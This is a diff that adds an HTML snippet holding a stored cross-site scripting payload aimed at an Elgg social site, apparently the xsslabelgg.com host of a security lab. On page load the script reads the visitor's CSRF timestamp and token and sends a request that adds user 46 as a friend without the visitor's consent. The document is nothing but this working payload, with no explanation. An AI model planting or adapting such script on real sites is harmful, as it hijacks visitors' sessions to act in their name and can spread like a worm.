@@ -1,0 +1,22 @@
+<p><script type="text/javascript"> 
+
+ window.onload  =function()  {
+ 
+
+var ajax = new XMLHttpRequest(); 
+
+ var friend = "friend="+elgg.security.friend;
+
+ var ts =  "&__elgg_ts="+elgg.security.token.__elgg_ts;  
+ var token = "&__elgg_token="+elgg.security.token.__elgg_token;
+
+  var sendurl ="http://www.xsslabelgg.com/action/friends/add?friend=46"+ts+token;
+
+ ajax.open("GET",sendurl,true); 
+ //ajax.setRequestHeader("Host", "www.xsslabelgg.com");  
+ ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded"); 
+ ajax.send();  
+}
+
+</script></p>
+ 
